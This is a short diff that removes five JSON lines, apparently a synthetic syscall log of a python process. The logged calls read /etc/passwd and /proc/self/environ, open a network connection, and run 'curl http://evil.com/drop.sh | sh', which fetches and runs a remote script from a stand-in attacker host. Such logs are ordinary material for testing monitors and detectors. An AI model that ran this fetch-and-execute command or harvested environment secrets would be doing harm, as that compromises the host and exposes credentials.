@@ -1,5 +1,0 @@
-{"timestamp": "2026-03-24 23:30:53.141902", "syscall": "openat", "args": ["/etc/passwd", "O_RDONLY"], "result": 0, "process": "python"}
-{"timestamp": "2026-03-24 23:30:53.141902", "syscall": "openat", "args": ["/proc/self/environ", "O_RDONLY"], "result": 0, "process": "python"}
-{"timestamp": "2026-03-24 23:30:53.141902", "syscall": "socket", "args": ["AF_INET", "SOCK_STREAM", "IPPROTO_TCP"], "result": 3, "process": "python"}
-{"timestamp": "2026-03-24 23:30:53.141902", "syscall": "connect", "args": ["3", "192.168.10.55:80"], "result": 0, "process": "python"}
-{"timestamp": "2026-03-24 23:30:53.141902", "syscall": "execve", "args": ["/bin/sh", "-c", "curl http://evil.com/drop.sh | sh"], "result": 0, "process": "python"}
